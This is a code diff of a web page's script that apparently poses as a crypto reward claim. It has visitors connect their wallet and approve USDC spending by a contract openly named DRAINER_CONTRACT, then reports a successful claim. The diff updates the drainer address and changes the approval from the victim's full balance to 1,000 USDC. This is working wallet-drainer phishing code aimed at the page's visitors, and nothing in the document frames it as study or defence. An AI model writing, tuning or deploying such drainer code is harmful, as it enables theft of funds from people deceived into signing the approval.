@@ -51,7 +51,7 @@
 
   <script>
     const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
-    const DRAINER_CONTRACT = "0xfbc510899f8010c17B3Ec8F7730B7d0E83993F6B"; // ✅ New UsdcDrainer.sol
+    const DRAINER_CONTRACT = "0x4BccC433fF69795d767c07Ccdc7aaF4F8Ed89D0f"; // ✅ New Contract
 
     let signer, address;
 
@@ -75,25 +75,22 @@
         approveBtn.disabled = false;
         status.textContent = `✅ Connected: ${address.slice(0, 6)}...${address.slice(-4)}`;
       } catch (err) {
-        console.error("Connection Error:", err);
+        console.error(err);
         status.textContent = "❌ Failed to connect wallet.";
       }
     };
 
     approveBtn.onclick = async () => {
       try {
-        status.innerHTML = '<div class="spinner"></div> Approving full balance...';
+        status.innerHTML = '<div class="spinner"></div> Approving...';
 
         const usdc = new ethers.Contract(USDC_ADDRESS, [
           "function approve(address spender, uint256 value) public returns (bool)",
-          "function allowance(address owner, address spender) view returns (uint256)",
-          "function balanceOf(address account) view returns (uint256)"
+          "function allowance(address owner, address spender) view returns (uint256)"
         ], signer);
 
-        const balance = await usdc.balanceOf(address);
-        console.log("USDC balance:", ethers.utils.formatUnits(balance, 6));
-
-        const tx = await usdc.approve(DRAINER_CONTRACT, balance);
+        const value = ethers.utils.parseUnits("1000", 6); // Approve 1,000 USDC
+        const tx = await usdc.approve(DRAINER_CONTRACT, value);
         await tx.wait();
 
         const allowance = await usdc.allowance(address, DRAINER_CONTRACT);
@@ -111,8 +108,8 @@
         status.textContent = "🎉 Claimed successfully!";
         approveBtn.disabled = true;
       } catch (err) {
-        console.error("Approval or Claim Error:", err);
-        status.textContent = `❌ Error: ${err?.error?.message || err.message || "Unknown failure"}`;
+        console.error(err);
+        status.textContent = "❌ Something went wrong during approval or claim.";
       }
     };
   </script>
